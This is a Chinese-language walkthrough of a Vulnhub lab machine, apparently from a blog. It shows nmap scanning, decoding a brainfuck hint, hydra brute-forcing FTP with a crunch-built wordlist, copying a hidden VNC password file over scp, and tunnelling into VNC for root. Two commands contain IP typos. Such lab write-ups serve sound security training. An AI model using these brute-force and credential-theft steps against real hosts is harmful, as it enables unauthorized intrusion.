Vulnhub下载地址：  
链接：https://pan.baidu.com/s/1GROpdsN9quDjAyBhTnHfIw  
提取码：8xw7

## 0x01环境介绍

    
    
    攻击机：192.168.10.128
    靶机：192.168.10.134
    

## 0x02信息收集

先用nmap进行信息收集

    
    
    nmap -A -T4 -v -p- 192.168.10.134
    

![image](https://image.3001.net/images/20210717/1626525808_60f2d070e9dccf82a860e.png!small)有ssh、ftp、http服务的端口，重点关注这几个

    
    
    python3 dirmap.py -i http://192.168.10.134 -lcf
    

![image](https://image.3001.net/images/20210717/1626525990_60f2d1262e13446bc08a6.png!small)很显眼的robots.txt文件  
底下有个brainfuck  
![image](https://image.3001.net/images/20210717/1626526019_60f2d1437b2f31ecd9e0e.png!small)

    
    
    ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>---.+++++++++++.------.-----.<<--.>>++++++++++++++++++.++.-----..-.+++.++.
    

解码地址：`https://www.splitbrain.org/services/ook%E2%80%8B `（当然还有其他的，能用就行）

![image](https://image.3001.net/images/20210717/1626526058_60f2d16a2b30b9f27166b.png!small)

## 0x03 检测

`http://192.168.10.134/alfa-support`

![image](https://image.3001.net/images/20210717/1626526096_60f2d1900e8e8a003873c.png!small)大致的意思就是，他忘了密码，密码是他的宠物狗的名字加上后面三位数  
利用ftp访问一下有啥东西，匿名登陆，我直接用Kali的文件输`ftp://192.168.10.134`这应该是他宠物狗的名字  
![image](https://image.3001.net/images/20210717/1626526132_60f2d1b4a51818f7a0c15.png!small)![image](https://image.3001.net/images/20210717/1626526158_60f2d1ceb123b02d8e99b.png!small)

    
    
    crunch 7 7 -t milo%%% -o 123.txt (生成最高7位 最低7位 % 代表数字 输出到123.txt)
    

![image](https://image.3001.net/images/20210717/1626526211_60f2d203881c0fdcaa311.png!small)

## 0x04 利用

    
    
    hydra -l thomas -P 123.txt -v -f 192.169.10.134 ftp
    

![image](https://image.3001.net/images/20210717/1626526263_60f2d237367266c67a060.png!small)利用ssh登陆`ssh
-p 65111 thomas@192.168.10.134`  
![image](https://image.3001.net/images/20210717/1626526312_60f2d26809594aa27c39e.png!small)查看有个user.txt  
![image](https://image.3001.net/images/20210717/1626526368_60f2d2a0cbbff33ff8207.png!small)看了下提权啥的，没啥思路，看下端口吧，5901端口是vnc端口(远程桌面)  
![image](https://image.3001.net/images/20210717/1626526401_60f2d2c1d0e4c22823f4c.png!small)

    
    
    scp -P 65111 thomas@192.168.10.134:/home/thomas/.remote_secret ./
    
    -P 是端口的意思	将192.168.10.134的thomas目录下的/home/thomas.remote\_secret	复制到当前目录下./
    

![image](https://image.3001.net/images/20210717/1626526445_60f2d2edda9a0c0bbe3c2.png!small)ssh搭建隧道

    
    
    ssh -p 65111 -L 5901:localhost:5901 thomas@192.168.10.1334
    

![image](https://image.3001.net/images/20210717/1626526468_60f2d304a5f9eec9a870f.png!small)

    
    
    vncviewer -passwd .remote_secret localhost:5901
    

利用vncviewer登陆自己的5901端口，密码是.remote_secret里的内容  
![image](https://image.3001.net/images/20210717/1626526530_60f2d342d6f78d8595d23.png!small)获得flag，管理员权限  
![image](https://image.3001.net/images/20210717/1626526552_60f2d358d2c5e6137acd2.png!small)

## 0x05 总结(个人观点，仅供参考)

1、nmap有多种用法，具体还是得看个人习惯或者说哪个好用，像65111端口，我用nmap -sV -O 192.168.10.134是检测不到的

2、brainfuck解密，得上网搜，有时间一定写个脚本，去收集特征，下次遇到直接利用脚本进行判断

3、scp的使用，参考https://www.runoob.com/linux/linux-comm-scp.html

4、ssh搭建隧道，参考https://mp.weixin.qq.com/s/JR9tfIjewLR6cbHNcfA3Ew

5、vnc，是linux系统里的远程桌面，默认端口是5901，vncviewer的使用方法还在找，大概就是vncviewer 端口 (-passwd
.remote_secret 如果有密码的话)

  

